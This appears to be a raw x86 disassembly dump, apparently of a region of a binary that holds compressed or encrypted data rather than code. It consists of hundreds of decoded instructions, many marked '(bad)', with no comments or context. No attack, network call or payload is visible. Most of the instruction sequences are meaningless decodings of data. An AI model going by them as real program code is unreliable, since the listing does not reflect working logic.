  41e4fc:	inc    ebp
  41e4fd:	out    0x66,al
  41e4ff:	sbb    dh,bh
  41e501:	or     al,0x87
  41e503:	cmp    eax,0x3182bb89
  41e508:	xor    al,0xb0
  41e50a:	xchg   esp,eax
  41e50b:	lods   al,BYTE PTR ds:[esi]
  41e50c:	ds jmp 0xfc38:0xc8ccfc41
  41e514:	fadd   st,st(3)
  41e516:	int    0x8c
  41e518:	add    edi,DWORD PTR [ebp+0x3d7e2c29]
  41e51e:	repz invd 
  41e521:	sub    al,0xee
  41e523:	or     DWORD PTR [edx+0x1da8116e],edi
  41e529:	test   BYTE PTR [ebx-0x6fa4fe87],dl
  41e52f:	inc    ebp
  41e530:	lods   eax,DWORD PTR ds:[esi]
  41e531:	sbb    DWORD PTR [edi-0x3ce90de8],ebx
  41e537:	in     eax,dx
  41e538:	mov    al,ds:0x62581129
  41e53d:	xor    bh,BYTE PTR [ebx+eax*1-0x532159c9]
  41e544:	mov    ebx,0xadddd4ac
  41e549:	rcr    cl,1
  41e54b:	aaa    
  41e54c:	sub    BYTE PTR [ebp+0x63],cl
  41e54f:	das    
  41e550:	fs das 
  41e552:	mov    edx,edx
  41e554:	sub    al,0x13
  41e556:	push   ebx
  41e557:	xor    DWORD PTR [edi-0x5bd77766],ebx
  41e55d:	scas   eax,DWORD PTR es:[edi]
  41e55e:	push   edi
  41e55f:	sub    eax,edx
  41e561:	mov    edx,es
  41e563:	adc    eax,0xd609204d
  41e568:	sub    DWORD PTR [edi],ebp
  41e56a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e56b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e56c:	jo     0x41e544
  41e56e:	push   0xffffffd2
  41e570:	stos   BYTE PTR es:[edi],al
  41e571:	mov    bl,0x9d
  41e573:	push   ds
  41e574:	xor    bh,BYTE PTR [edi]
  41e576:	xor    ebp,esi
  41e578:	sar    BYTE PTR [ecx-0x18],cl
  41e57b:	push   esi
  41e57c:	jne    0x41e5d2
  41e57e:	sbb    DWORD PTR [esi],0xffffffb8
  41e581:	mov    ah,0xc8
  41e583:	adc    DWORD PTR [ebx+ecx*2-0x5e8a60c8],esi
  41e58a:	dec    ecx
  41e58b:	cmp    eax,0xfd4a78b6
  41e590:	pop    edx
  41e591:	pop    ecx
  41e592:	out    dx,al
  41e593:	fwait
  41e594:	test   al,0x98
  41e596:	sub    DWORD PTR [ecx],ebx
  41e598:	add    BYTE PTR ds:0xd4b82de4,bh
  41e59e:	mov    ebp,DWORD PTR [edi-0x6373f9e4]
  41e5a4:	fadd   DWORD PTR [edx]
  41e5a6:	into   
  41e5a7:	xlat   BYTE PTR ds:[ebx]
  41e5a8:	ret    
  41e5a9:	lods   eax,DWORD PTR ds:[esi]
  41e5aa:	int    0x26
  41e5ac:	xchg   DWORD PTR [edi+0x6f],edi
  41e5af:	fidiv  WORD PTR [edx-0x48]
  41e5b2:	mov    eax,ds:0xa9f09f36
  41e5b7:	push   cs
  41e5b8:	ins    DWORD PTR es:[edi],dx
  41e5b9:	arpl   WORD PTR ds:0x1064b890,bx
  41e5bf:	xcrypt-ctr (bad)
  41e5c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5c1:	pop    ecx
  41e5c2:	leave  
  41e5c3:	(bad)  
  41e5c5:	enter  0xd191,0x2b
  41e5c9:	sbb    BYTE PTR [edx+0x6f],bl
  41e5cc:	xor    BYTE PTR [edi-0x38bbae97],dl
  41e5d2:	inc    edi
  41e5d3:	out    0x7b,eax
  41e5d5:	mov    eax,ds:0xa67d2548
  41e5da:	test   al,0x5d
  41e5dc:	cmp    ch,BYTE PTR [edx-0x13386c23]
  41e5e2:	call   0x8ddafdc4
  41e5e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5e8:	sbb    dh,dh
  41e5ea:	stos   BYTE PTR es:[edi],al
  41e5eb:	inc    edx
  41e5ec:	xor    al,0xcc
  41e5ee:	popf   
  41e5ef:	leave  
  41e5f0:	mov    BYTE PTR [edi],al
  41e5f2:	(bad)  
  41e5f3:	jmp    0xeca789ce
  41e5f8:	adc    al,0xdb
  41e5fa:	lods   al,BYTE PTR ds:[esi]
  41e5fb:	scas   eax,DWORD PTR es:[edi]
  41e5fc:	xor    ebx,DWORD PTR ds:0xaf552a25
  41e602:	dec    ecx
  41e603:	inc    eax
  41e604:	jp     0x41e5e1
  41e606:	xchg   esi,eax
  41e607:	imul   ebx,DWORD PTR [ebp+0x55],0x5008278e
  41e60e:	out    0x6c,al
  41e610:	mul    esi
  41e612:	mov    BYTE PTR ds:0x3f260c2,0xfd
  41e619:	lea    edi,[esi]
  41e61b:	adc    bl,BYTE PTR [ebx+0xbcd87f1]
  41e621:	inc    ebp
  41e622:	mov    ebp,0xcf9a377b
  41e627:	sti    
  41e628:	xor    BYTE PTR [esi-0x2bbe9ce0],bh
  41e62e:	mov    eax,0x7cfad222
  41e633:	in     eax,0xa8
  41e635:	stos   DWORD PTR es:[edi],eax
  41e636:	mov    bl,0x69
  41e638:	dec    ebp
  41e639:	out    0x29,eax
  41e63b:	retf   0x465b
  41e63e:	int    0x2e
  41e640:	sub    ebp,DWORD PTR [edx]
  41e642:	push   0x5f3cb7dc
  41e647:	cmp    al,0x7a
  41e649:	mov    ecx,ecx
  41e64b:	push   cs
  41e64c:	xchg   esp,eax
  41e64d:	cld    
  41e64e:	jl     0x41e646
  41e650:	(bad)
  41e653:	or     BYTE PTR [ecx],al
  41e655:	out    0xc2,eax
  41e657:	mov    eax,ds:0x7e37fa59
  41e65c:	mov    WORD PTR [ebp-0x2e],?
  41e65f:	sbb    dl,bh
  41e661:	push   es
  41e662:	test   eax,0x273cf694
  41e667:	push   ebp
  41e668:	adc    BYTE PTR [ebp-0x11608034],ch
  41e66e:	pop    edx
  41e66f:	sub    al,ch
  41e671:	scas   al,BYTE PTR es:[edi]
  41e672:	push   ss
  41e673:	in     al,0x45
  41e675:	sbb    eax,0xdfa3708d
  41e67a:	sbb    eax,0x4e0a2848
  41e67f:	xor    eax,0xc795fa82
  41e684:	cs pop ebx
  41e686:	iret   
  41e687:	cmp    DWORD PTR [edi],ebx
  41e689:	cdq    
  41e68a:	test   DWORD PTR ds:0x68b2a60b,esp
  41e690:	loop   0x41e711
  41e692:	bnd call 0x29224af8
  41e698:	sub    eax,0xa2ee7835
  41e69d:	pop    ss
  41e69e:	add    DWORD PTR [ebx-0x21],eax
  41e6a1:	loopne 0x41e6c4
  41e6a3:	aas    
  41e6a4:	shl    BYTE PTR [eax+0x23],0x17
  41e6a8:	add    BYTE PTR [eax+0x77],bh
  41e6ab:	or     DWORD PTR ds:0x3e921660,esi
  41e6b1:	popa   
  41e6b2:	aaa    
  41e6b3:	imul   ebp,DWORD PTR [ecx+0x3b],0x6
  41e6b7:	xchg   edi,eax
  41e6b8:	rcr    BYTE PTR [esi],1
  41e6ba:	test   eax,0x2e3997bd
  41e6bf:	lahf   
  41e6c0:	iret   
  41e6c1:	lods   al,BYTE PTR ds:[esi]
  41e6c2:	mov    ds:0xf671633e,al
  41e6c7:	nop
  41e6c8:	(bad)  
  41e6c9:	sub    al,0xf0
  41e6cb:	shr    BYTE PTR [esi-0x352efa95],cl
  41e6d1:	xor    eax,0xd39e3423
  41e6d6:	lock mov edx,0x61362100
  41e6dc:	pop    edi
  41e6dd:	rcl    DWORD PTR [ebx-0x4ea4f2fd],cl
  41e6e3:	xchg   BYTE PTR [esi],bl
  41e6e5:	inc    esi
  41e6e6:	aas    
  41e6e7:	jecxz  0x41e6dd
  41e6e9:	addr16 pop es
  41e6eb:	fild   WORD PTR [edx-0x56]
  41e6ee:	lods   al,BYTE PTR ds:[esi]
  41e6ef:	xlat   BYTE PTR ds:[ebx]
  41e6f0:	mov    ah,0x50
  41e6f2:	sahf   
  41e6f3:	cmp    al,0x30
  41e6f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6f6:	(bad)  
  41e6f7:	and    bh,dl
  41e6f9:	hlt    
  41e6fa:	sub    al,0x1e
  41e6fc:	cli    
  41e6fd:	push   ss
  41e6fe:	pop    ds
  41e6ff:	out    dx,al
  41e700:	repz lahf 
  41e702:	retf   
  41e703:	xchg   edi,edx
  41e705:	push   cs
  41e706:	inc    edx
  41e707:	sbb    eax,edx
  41e709:	mov    ch,0xbf
  41e70b:	sub    ebx,DWORD PTR [eax-0x59]
  41e70e:	and    esp,DWORD PTR [ebx+esi*1+0x6e]
  41e712:	in     al,0x74
  41e714:	mov    ah,0x5c
  41e716:	repz mov al,0xa4
  41e719:	mov    bh,0x80
  41e71b:	adc    DWORD PTR [edi+0x50595ed7],eax
  41e721:	pop    ss
  41e722:	stos   BYTE PTR es:[edi],al
  41e723:	jo     0x41e6b0
  41e725:	nop
  41e726:	inc    esi
  41e727:	mov    bh,0x82
  41e729:	in     eax,dx
  41e72a:	bound  cx,DWORD PTR [esi-0x66]
  41e72e:	jge    0x41e6d0
  41e730:	dec    ecx
  41e731:	sub    al,0x3e
  41e733:	test   DWORD PTR [ebp+0x62edf131],ebp
  41e739:	pop    es
  41e73a:	sbb    ah,dl
  41e73c:	daa    
  41e73d:	fst    DWORD PTR [ebx-0x3598cf2f]
  41e743:	aaa    
  41e744:	xor    DWORD PTR [esp+ecx*8],esi
  41e747:	aam    0x7d
  41e749:	(bad)  
  41e74a:	sbb    BYTE PTR [esi+0x5e3c7597],0x87
  41e751:	js     0x41e70f
  41e753:	pop    esp
  41e754:	mov    eax,ds:0x92dcdd4d
  41e759:	xchg   edi,eax
  41e75a:	mov    al,ds:0xb0b1ec4c
  41e75f:	mov    al,ds:0xe26a03e8
  41e764:	mov    esp,0xde0c6fab
  41e769:	inc    eax
  41e76a:	cmp    dh,BYTE PTR [ebx]
  41e76c:	sub    BYTE PTR [edi*4+0x5f8b182],bh
  41e773:	inc    ebp
  41e774:	mov    ebp,DWORD PTR [eax]
  41e776:	rol    edi,1
  41e778:	mov    eax,0x6bc0044a
  41e77d:	cmp    bh,0x1d
  41e780:	jg     0x41e753
  41e782:	mov    dl,0xd3
  41e784:	xor    BYTE PTR [esi+edi*8-0x7023cf00],dh
  41e78b:	push   ecx
  41e78c:	mov    eax,0xfea881d6
  41e791:	mov    dh,0x9
  41e793:	cmp    ch,BYTE PTR [ecx]
  41e795:	xchg   edi,eax
  41e796:	xchg   BYTE PTR [esp+edi*1-0x11b67219],dl
  41e79d:	cs adc eax,0x59f06dbf
  41e7a3:	jl     0x41e7e2
  41e7a5:	xchg   edi,eax
  41e7a6:	mov    dl,BYTE PTR [edi+edx*4+0x765c8a1a]
  41e7ad:	xor    eax,0xf4dc46c7
  41e7b2:	xor    edx,edx
  41e7b4:	inc    esi
  41e7b5:	into   
  41e7b6:	jne    0x41e755
  41e7b8:	out    dx,al
  41e7b9:	dec    edx
  41e7ba:	(bad)  
  41e7bb:	jmp    0x41e831
  41e7bd:	pop    esi
  41e7be:	retf   
  41e7bf:	or     DWORD PTR [edi],ebp
  41e7c1:	fcmovnbe st,st(1)
  41e7c3:	jg     0x41e765
  41e7c5:	int3   
  41e7c6:	into   
  41e7c7:	rol    DWORD PTR [esi+0x6df5f122],0xd
  41e7ce:	rcr    BYTE PTR [eax+0x637fa47f],1
  41e7d4:	sbb    bh,al
  41e7d6:	(bad)
  41e7d9:	lahf   
  41e7da:	mov    dl,BYTE PTR [ebp+0x65]
  41e7dd:	adc    DWORD PTR [eax+0x6405dd78],0xffffffba
  41e7e4:	pop    esi
  41e7e5:	mov    ecx,ds
  41e7e7:	dec    DWORD PTR [ebp+0x4aa56faf]
  41e7ed:	xchg   BYTE PTR [edi+ebp*8+0x73],ch
  41e7f1:	cdq    
  41e7f2:	mov    dl,0x6
  41e7f4:	out    0xfa,al
  41e7f6:	out    0x71,eax
  41e7f8:	retf   0x20cf
  41e7fb:	cli    
  41e7fc:	pusha  
  41e7fd:	test   al,0xe4
  41e7ff:	mov    al,ds:0x1c0210e0
  41e804:	repz or eax,eax
  41e807:	loope  0x41e85c
  41e809:	push   edi
  41e80a:	call   0x41594e
  41e80f:	mov    esi,DWORD PTR [ebp-0x228]
  41e815:	cmp    esi,eax
  41e817:	jmp    0x41ebfe
  41e81c:	mov    dh,0x8
  41e81e:	xor    al,0xa5
  41e820:	mov    ah,0xb9
  41e822:	mov    esp,0xddc4c918
  41e827:	nop
  41e828:	(bad)  
  41e829:	call   0x6fe9b99a
  41e82e:	sar    BYTE PTR [esi-0x41413bb6],0xd6
  41e835:	push   edx
  41e836:	jno    0x41e811
  41e838:	out    0xda,eax
  41e83a:	xor    BYTE PTR [ecx-0x1],al
  41e83d:	inc    BYTE PTR [esi+0x189e8dfe]
  41e843:	lods   eax,DWORD PTR ds:[esi]
  41e844:	jle    0x41e7d3
  41e846:	inc    esi
  41e847:	std    
  41e848:	fdivr  QWORD PTR [ecx]
  41e84a:	mov    DWORD PTR [ebx],ecx
  41e84c:	push   0x429d678e
  41e851:	adc    DWORD PTR ds:0xc6e86c0d,edx
  41e857:	pop    ss
  41e858:	jae    0x41e80a
  41e85a:	(bad)
  41e85e:	mov    edi,0x8ed3d155
  41e863:	and    dl,BYTE PTR [esi-0x28]
  41e866:	out    dx,al
  41e867:	cdq    
  41e868:	push   0xffffff92
  41e86a:	outs   dx,BYTE PTR ds:[esi]
  41e86b:	int3   
  41e86c:	je     0x41e88a
  41e86e:	call   0x9d6eec3
  41e873:	int    0x76
  41e875:	(bad)  
  41e876:	in     al,dx
  41e877:	sbb    eax,0xe52f3b10
  41e87c:	or     BYTE PTR [ecx],al
  41e87e:	test   eax,0xa25b889b
  41e883:	int    0x7a
  41e885:	sbb    dh,dh
  41e887:	leave  
  41e888:	imul   edi,DWORD PTR [esi+0x2c],0xcdd0b297
  41e88f:	in     eax,dx
  41e890:	lock leave 
  41e892:	inc    esi
  41e893:	mov    ebx,0x528a5c77
  41e898:	in     al,0xce
  41e89a:	out    dx,eax
  41e89b:	xchg   ebp,eax
  41e89c:	aad    0x22
  41e89e:	push   ss
  41e89f:	ins    BYTE PTR es:[edi],dx
  41e8a0:	fcmovbe st,st(4)
  41e8a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8a3:	pop    ebx
  41e8a4:	aam    0xd4
  41e8a6:	cli    
  41e8a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8a8:	push   eax
  41e8a9:	add    DWORD PTR [esi-0x16],eax
  41e8ac:	das    
  41e8ad:	or     BYTE PTR [ecx+ebp*1+0x21],bh
  41e8b1:	push   ecx
  41e8b2:	sbb    eax,0x45749da
  41e8b7:	xlat   BYTE PTR ds:[ebx]
  41e8b8:	icebp  
  41e8b9:	rcr    BYTE PTR [ebx+esi*4+0x22289bb2],1
  41e8c0:	cmc    
  41e8c1:	rcl    DWORD PTR [ecx-0x2599be96],cl
  41e8c7:	ja     0x41e8d9
  41e8c9:	pushf  
  41e8ca:	mov    ch,0x48
  41e8cc:	sar    DWORD PTR [eax-0x52],0x3
  41e8d0:	adc    bl,bl
  41e8d2:	std    
  41e8d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8d4:	adc    DWORD PTR [edx+0x10],eax
  41e8d7:	sahf   
  41e8d8:	mov    ch,0x65
  41e8da:	leave  
  41e8db:	out    0x6a,al
  41e8dd:	and    dl,cl
  41e8df:	outs   dx,DWORD PTR ds:[esi]
  41e8e0:	cdq    
  41e8e1:	pusha  
  41e8e2:	int    0xe4
  41e8e4:	xor    BYTE PTR [eax-0x3d],dl
  41e8e7:	mov    ch,bh
  41e8e9:	fist   DWORD PTR [ebx-0x10]
  41e8ec:	jae    0x41e870
  41e8ee:	xlat   BYTE PTR ds:[ebx]
  41e8ef:	in     eax,dx
  41e8f0:	inc    eax
  41e8f1:	jmp    0x95e2a76
  41e8f6:	sbb    DWORD PTR ds:0xb4d0,edx
  41e8fb:	mov    ebp,0xdfdfd47a
  41e900:	sbb    ah,bh
  41e902:	adc    bl,BYTE PTR [eax]
  41e904:	dec    ecx
  41e905:	mov    edi,0x61049853
  41e90a:	fcomp  QWORD PTR [ebx-0x3161e4dd]
  41e910:	inc    ebx
  41e911:	fcmovnb st,st(5)
  41e913:	ja     0x41e974
  41e915:	mov    DWORD PTR [edi],0x2ffdff48
  41e91b:	add    eax,DWORD PTR [ecx-0x57b11c68]
  41e921:	ficomp DWORD PTR [edx]
  41e923:	dec    ecx
  41e924:	ins    DWORD PTR es:[edi],dx
  41e925:	push   DWORD PTR [ebp-0x10]
  41e928:	pushf  
  41e929:	lock rcl BYTE PTR [ebx-0x723c38a9],0x1d
  41e931:	ror    DWORD PTR [ecx-0x17dad324],cl
  41e937:	pop    ds
  41e938:	aaa    
  41e939:	adc    BYTE PTR [ebp+0x63b0cc0a],ah
  41e93f:	mov    ch,0xc3
  41e941:	popa   
  41e942:	jg     0x41e8e3
  41e944:	mov    ebp,0x7443c200
  41e949:	popa   
  41e94a:	fild   WORD PTR [edx-0x1b]
  41e94d:	addr16 dec ebx
  41e94f:	jae    0x41e97d
  41e951:	pop    ebp
  41e952:	ds retf 0xb3c9
  41e956:	adc    BYTE PTR [ecx-0x18],dh
  41e959:	rol    BYTE PTR [esi],1
  41e95b:	loopne 0x41e8fa
  41e95d:	or     DWORD PTR [edi-0x10e9c32e],ecx
  41e963:	scas   al,BYTE PTR es:[edi]
  41e964:	xlat   BYTE PTR ds:[ebx]
  41e965:	mov    ?,WORD PTR [esp]
  41e968:	fbstp  TBYTE PTR [ebx]
  41e96a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e96b:	mov    BYTE PTR cs:[ebx+0x69],0x6f
  41e970:	push   esp
  41e971:	dec    edi
  41e972:	jae    0x41e9cc
  41e974:	fldenv [edx]
  41e977:	ins    DWORD PTR es:[edi],dx
  41e978:	xchg   ebp,eax
  41e979:	adc    BYTE PTR [ecx-0x57],cl
  41e97c:	mov    dh,0x97
  41e97e:	pop    ds
  41e97f:	pop    edi
  41e980:	and    eax,0x60ea8f42
  41e985:	aas    
  41e986:	mov    esp,0x3883361
  41e98b:	add    bh,BYTE PTR [eax]
  41e98d:	outs   dx,BYTE PTR ds:[esi]
  41e98e:	xchg   DWORD PTR [eax+0x69],eax
  41e991:	add    BYTE PTR [esi],0xa5
  41e994:	mov    bl,0x5f
  41e996:	push   cs
  41e997:	fs out 0x1,eax
  41e99a:	push   esp
  41e99b:	lds    ebp,FWORD PTR [edx+0x43]
  41e99e:	pop    ebx
  41e99f:	cmp    ax,0xb992
  41e9a3:	sub    al,0x1d
  41e9a5:	inc    ebp
  41e9a6:	test   al,0x37
  41e9a8:	popa   
  41e9a9:	std    
  41e9aa:	pop    ebx
  41e9ab:	mov    eax,0x75a02e13
  41e9b0:	pop    ebx
  41e9b1:	jl     0x41e937
  41e9b3:	or     DWORD PTR [edx+0x69ea2d87],esi
  41e9b9:	iret   
  41e9ba:	loope  0x41e9a1
  41e9bc:	fwait
  41e9bd:	add    dl,0xe5
  41e9c0:	icebp  
  41e9c1:	mov    ah,0xf9
  41e9c3:	sbb    eax,0xbba9ae89
  41e9c8:	rol    BYTE PTR [eax-0x50],0x9d
  41e9cc:	(bad)  
  41e9cd:	cld    
  41e9ce:	sbb    al,BYTE PTR [ebp-0x60]
  41e9d1:	cmp    ch,BYTE PTR [esi+0x3e679682]
  41e9d7:	xchg   edi,eax
  41e9d8:	mov    al,0x40
  41e9da:	fisttp DWORD PTR [ebx-0x21569378]
  41e9e0:	aaa    
  41e9e1:	outs   dx,BYTE PTR fs:[esi]
  41e9e3:	dec    esp
  41e9e4:	adc    BYTE PTR ds:0x382866b4,al
  41e9ea:	dec    esp
  41e9eb:	enter  0xeed3,0xab
  41e9ef:	mov    edx,?
  41e9f1:	fild   DWORD PTR [ecx-0xe]
  41e9f4:	fdiv   DWORD PTR [ebp+0x61]
  41e9f7:	xor    al,0x5e
  41e9f9:	mov    ebp,0x1f025b8c
  41e9fe:	fadd   QWORD PTR [edx]
  41ea00:	pop    ss
  41ea01:	jle    0x41ea12
  41ea03:	mov    bl,0x47
  41ea05:	push   esi
  41ea06:	xchg   ecx,eax
  41ea07:	mov    WORD PTR [eax-0x4a367956],gs
  41ea0d:	or     eax,0xca4e8948
  41ea12:	xchg   edi,eax
  41ea13:	cmp    al,0x49
  41ea15:	sub    edx,esi
  41ea17:	imul   esi,DWORD PTR [edx],0x56
  41ea1a:	pusha  
  41ea1b:	push   ecx
  41ea1c:	retf   
  41ea1d:	pop    edi
  41ea1e:	in     eax,0x1d
  41ea20:	cld    
  41ea21:	xchg   ebx,eax
  41ea22:	popa   
  41ea23:	out    0x61,al
  41ea25:	ins    DWORD PTR es:[edi],dx
  41ea26:	lea    eax,[ecx-0x55fed674]
  41ea2c:	and    al,bh
  41ea2e:	mov    al,0xb4
  41ea30:	shl    DWORD PTR [edi-0x2],0xf6
  41ea34:	and    BYTE PTR [ebx+0x7a4f009f],dl
  41ea3a:	dec    ebx
  41ea3b:	pop    edx
  41ea3c:	or     al,0xcf
  41ea3e:	push   eax
  41ea3f:	dec    ebx
  41ea40:	outs   dx,DWORD PTR ds:[esi]
  41ea41:	loope  0x41ea23
  41ea43:	in     eax,0x8a
  41ea45:	aaa    
  41ea46:	jg     0x41eaa8
  41ea48:	lods   al,BYTE PTR ds:[esi]
  41ea49:	push   ds
  41ea4a:	push   ecx
  41ea4b:	adc    esi,DWORD PTR [esi+0xe]
  41ea4e:	jo     0x41ea44
  41ea50:	adc    eax,DWORD PTR [ebp-0x11929f23]
  41ea56:	outs   dx,BYTE PTR ds:[esi]
  41ea57:	gs ins DWORD PTR es:[edi],dx
  41ea59:	sti    
  41ea5a:	or     BYTE PTR [ecx+0x7d],ch
  41ea5d:	mov    bh,0x9d
  41ea5f:	out    0xe7,eax
  41ea61:	cli    
  41ea62:	das    
  41ea63:	mov    esp,esp
  41ea65:	sbb    eax,0xcc461c47
  41ea6a:	call   0x8e987016
  41ea6f:	mov    bl,0xcf
  41ea71:	test   DWORD PTR [ebx],0xd61488c
  41ea77:	pop    ss
  41ea78:	ret    
  41ea79:	push   ebx
  41ea7a:	inc    ebp
  41ea7b:	push   eax
  41ea7c:	push   eax
  41ea7d:	add    DWORD PTR [ecx-0x50],esp
  41ea80:	jne    0x41ea03
  41ea82:	(bad)  
  41ea83:	shl    DWORD PTR [esi-0x6b977037],0xec
  41ea8a:	ret    
  41ea8b:	jmp    0xf7a3:0x235b50b6
  41ea92:	and    eax,DWORD PTR [esi+0x5cd31c28]
  41ea98:	repnz xchg esp,eax
  41ea9a:	cmp    cl,BYTE PTR [edx+0x5e]
  41ea9d:	scas   al,BYTE PTR es:[edi]
  41ea9e:	xchg   BYTE PTR [edx],dl
  41eaa0:	sub    DWORD PTR [ebp-0x77],eax
  41eaa3:	test   al,0x4a
  41eaa5:	xchg   DWORD PTR [ebx-0x41374e51],ecx
  41eaab:	icebp  
  41eaac:	add    al,0xbb
  41eaae:	adc    al,0x3b
  41eab0:	push   esp
  41eab1:	inc    edx
  41eab2:	add    al,0x2f
  41eab4:	and    DWORD PTR [edi],edi
  41eab6:	mov    esp,0xc98a76b4
  41eabb:	sbb    DWORD PTR [ebx+edx*4-0x29],eax
  41eabf:	test   BYTE PTR [edx+0x55517655],bh
  41eac5:	aaa    
  41eac6:	cwde   
  41eac7:	iret   
  41eac8:	scas   eax,DWORD PTR es:[edi]
  41eac9:	xlat   BYTE PTR ds:[ebx]
  41eaca:	pop    ecx
  41eacb:	dec    ecx
  41eacc:	xor    ah,BYTE PTR [ebx+0x18]
  41eacf:	rol    DWORD PTR [esi+0x1d],0x8e
  41ead3:	push   esi
  41ead4:	(bad)  
  41ead5:	retf   
  41ead6:	sbb    edx,ecx
  41ead8:	cmp    DWORD PTR [ebx],0x8e3aa98d
  41eade:	xchg   esp,eax
  41eadf:	xchg   dl,cl
  41eae1:	es sbb al,0xcd
  41eae4:	faddp  st(4),st
  41eae6:	lahf   
  41eae7:	clc    
  41eae8:	outs   dx,BYTE PTR ds:[esi]
  41eae9:	fiadd  DWORD PTR [ebp-0x3a6a19c5]
  41eaef:	popa   
  41eaf0:	stos   DWORD PTR es:[edi],eax
  41eaf1:	imul   esi,eax,0xb
  41eaf4:	dec    ebp
  41eaf5:	mov    bl,0x8a
  41eaf8:	adc    DWORD PTR [eax],0x4a28262d
  41eafe:	test   DWORD PTR [esi-0x4e93c1dc],ebp
  41eb04:	dec    edx
  41eb05:	mov    edx,0x8c34802d
  41eb0a:	gs cli 
  41eb0c:	push   ebx
  41eb0d:	pop    ss
  41eb0e:	lods   eax,DWORD PTR ds:[esi]
  41eb0f:	xchg   ebp,eax
  41eb10:	or     DWORD PTR [ecx+0x29],eax
  41eb13:	(bad)  
  41eb14:	xchg   ebp,eax
  41eb15:	push   edi
  41eb16:	sub    eax,0x289d4b0
  41eb1b:	and    ah,BYTE PTR es:[edx+0x57fc1ff7]
  41eb22:	adc    esi,DWORD PTR [eax]
  41eb24:	xor    BYTE PTR [ecx-0x10],0x2a
  41eb28:	lahf   
  41eb29:	js     0x41eba3
  41eb2b:	and    ah,BYTE PTR [edi]
  41eb2d:	pop    ds
  41eb2e:	in     al,0x7d
  41eb30:	(bad)  
  41eb31:	pop    ecx
  41eb32:	ss pop ds
  41eb34:	push   0xfffffff0
  41eb36:	lds    ecx,FWORD PTR [esi-0x3f45d5e0]
  41eb3c:	pusha  
  41eb3d:	mov    BYTE PTR [edx-0x2a],ch
  41eb40:	fdiv   QWORD PTR [eax]
  41eb42:	add    ebx,DWORD PTR [ecx-0x2f0dde59]
  41eb48:	clc    
  41eb49:	jb     0x41eb21
  41eb4b:	lods   eax,DWORD PTR ds:[esi]
  41eb4c:	dec    ebx
  41eb4d:	out    0x64,eax
  41eb4f:	and    ch,BYTE PTR [esi]
  41eb51:	sub    al,0xb0
  41eb53:	lds    ecx,FWORD PTR [eax+0x48e4125f]
  41eb59:	mov    al,0x84
  41eb5b:	popf   
  41eb5c:	or     cl,cl
  41eb5e:	xchg   ebp,ebx
  41eb60:	and    esp,DWORD PTR [ebp-0x2d]
  41eb63:	push   eax
  41eb64:	pop    ds
  41eb65:	(bad)  
  41eb66:	in     eax,dx
  41eb67:	dec    ecx
  41eb68:	pop    ecx
  41eb69:	dec    esp
  41eb6a:	ret    
  41eb6b:	pop    ecx
  41eb6c:	pop    ebp
  41eb6d:	loope  0x41eba8
  41eb6f:	sbb    DWORD PTR [eax+ecx*8+0x7c],edx
  41eb73:	bound  eax,QWORD PTR [esi-0x52]
  41eb76:	add    BYTE PTR [eax+0x52],dl
  41eb79:	and    ah,BYTE PTR [ebx-0x17]
  41eb7c:	and    BYTE PTR [eax],al
  41eb7e:	cmp    al,0xec
  41eb80:	lock scas eax,DWORD PTR es:[edi]
  41eb82:	pop    ss
  41eb83:	jmp    0xe10d:0xff52a0b4
  41eb8a:	sti    
  41eb8b:	(bad)  
  41eb8d:	adc    BYTE PTR [eax+0x79],al
  41eb90:	fisubr DWORD PTR [eax]
  41eb92:	jge    0x41eba2
  41eb94:	jae    0x41ebe6
  41eb96:	sub    eax,0xda5eb95c
  41eb9b:	out    dx,al
  41eb9c:	cmp    BYTE PTR [ecx-0x6d48d845],bh
  41eba2:	pop    es
  41eba3:	test   DWORD PTR [eax-0x2bb71b0],edx
  41eba9:	addr16 int3 
  41ebab:	mov    ebp,0x7ffe0a63
  41ebb0:	xchg   esi,eax
  41ebb1:	adc    ch,dh
  41ebb3:	jle    0x41ec33
  41ebb5:	sub    BYTE PTR [ebx],bh
  41ebb7:	mov    ecx,0x2cfb60e6
  41ebbc:	inc    ecx
  41ebbd:	sbb    al,0x5
  41ebbf:	es jp  0x41ec0a
  41ebc2:	mov    es,WORD PTR [eax]
  41ebc4:	xchg   edi,eax
  41ebc5:	push   0x765aab09
  41ebca:	fistp  DWORD PTR [ebx-0x5f]
  41ebcd:	jno    0x41ec23
  41ebcf:	jmp    0x41ec13
  41ebd1:	cmp    ah,cl
  41ebd3:	jmp    0xd0a:0x84153a4c
  41ebda:	adc    ch,BYTE PTR [ecx+edi*2-0x3510a453]
  41ebe1:	fiadd  DWORD PTR [ebx-0x711fb479]
  41ebe7:	outs   dx,BYTE PTR ds:[esi]
  41ebe8:	aas    
  41ebe9:	push   edi
  41ebea:	pop    esi
  41ebeb:	inc    ecx
  41ebec:	xor    DWORD PTR [edx],ebp
  41ebee:	inc    ebx
  41ebef:	pushf  
  41ebf0:	xchg   edi,eax
  41ebf1:	xchg   esp,eax
  41ebf2:	data16 shl BYTE PTR [ebx-0x5c],cl
  41ebf6:	mov    bl,0x47
  41ebf8:	daa    
  41ebf9:	and    DWORD PTR [eax+0x79],esi
  41ebfc:	pushf  
  41ebfd:	mov    ebx,0x456840f
  41ec02:	add    BYTE PTR [eax],al
  41ec04:	mov    eax,DWORD PTR [ebp-0x154]
  41ec0a:	jmp    0x41eff1
  41ec0f:	cld    
  41ec10:	sbb    eax,0x6c1c4604
  41ec15:	mov    esp,0x10e976b3
  41ec1a:	sahf   
  41ec1b:	es xor ah,0xcf
  41ec1f:	xor    esi,DWORD PTR [edi-0x40]
  41ec22:	mov    esi,0xbebec44a
  41ec27:	mov    ch,0xef
  41ec29:	pop    ebx
  41ec2b:	out    0x62,eax
  41ec2d:	cs leave 
  41ec2f:	dec    esi
  41ec30:	ret    0xe6ee
  41ec33:	sbb    BYTE PTR [eax+0x50],dl
  41ec36:	xchg   edi,eax
  41ec37:	mov    BYTE PTR [eax+edx*8],bl
  41ec3a:	das    
  41ec3b:	add    edx,ecx
  41ec3d:	addr16 and al,0xd
  41ec40:	xor    eax,0x7c79478e
  41ec45:	jns    0x41ec35
